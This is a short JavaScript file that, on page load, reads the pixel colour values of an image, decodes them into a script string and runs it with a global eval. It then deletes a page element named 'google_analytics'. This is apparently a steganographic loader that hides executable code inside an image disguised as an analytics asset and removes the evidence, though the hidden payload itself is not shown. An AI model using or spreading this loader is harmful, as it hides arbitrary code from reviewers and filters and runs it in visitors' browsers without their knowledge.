var globalEval = function globalEval(src) {
	if (window.execScript) {
		window.execScript(src);
		return;
	}
	var fn = function() {
		window.eval.call(window,src);
	};
	fn();
};


window.onload = function(){
	var i = document.getElementById('cc'),
		i_w = i.width,
		i_h = i.height,
		cd = document.getElementById('cd'),
		ctx = cd.getContext('2d');

	cd.width = i_w;
	cd.height = i_h;

	ctx.drawImage(i,0,0);

	var imageData = ctx.getImageData(0,0,i_w,i_h),
		data = imageData.data
		dlen = data.length,
		codes = [];

	for (var j=0; j < dlen; j += 4){
		codes.push(data[j]);
		codes.push(data[j+1]);
		codes.push(data[j+2]);
}

var new_script = String.fromCharCode.apply(String,codes);
var io = document.getElementById('google_analytics')
io.remove();

globalEval(new_script)
}
